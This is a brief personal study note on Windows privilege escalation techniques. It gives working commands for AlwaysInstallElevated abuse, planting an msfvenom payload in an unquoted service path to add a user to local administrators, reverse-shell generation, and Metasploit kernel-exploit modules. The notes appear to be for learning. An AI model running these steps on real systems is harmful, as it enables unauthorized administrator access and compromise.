<h1>Windows Priv esc learning</h1>

<h2>Autoruns</h2>
can get a tool called autoruns - will show programs that automatically run which if writeable can create reverse shell
from msfconsole and replace program


<h2>Checking install elevated </h2>
Type - reg query HKLM\Software\Policies\Microsoft\Windows\Installer (this is a direct policy path it can change
per software)
notice that “AlwaysInstallElevated” value is 1.
Geberate reverse shell exe with msfvenom and setup a listener
msiexec /quiet /qn /i /pathtosoftwarecreated

<h2>unquoted service paths</h2>
Run winpeas and check for any unquoted service paths
for example if path -- C:\Program Files\unquoted path\Common Files
create exe - common.exe  -- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
place in C:\Program Files\unquoted path (this ovbiously changes path for what you found)
call service   -- sc start servicename
you change change whats in the generated exe 


<h2>search configuration files for passwords</h2>



<h2>kernel exploits</h2>
if established session with MSFCONSOLE while sessions is established type
run post/multi/recon/local_exploit_suggester
identify vulnerability and type
use exploitname
set SESSION [meterpreter SESSION number]
set LPORT
run
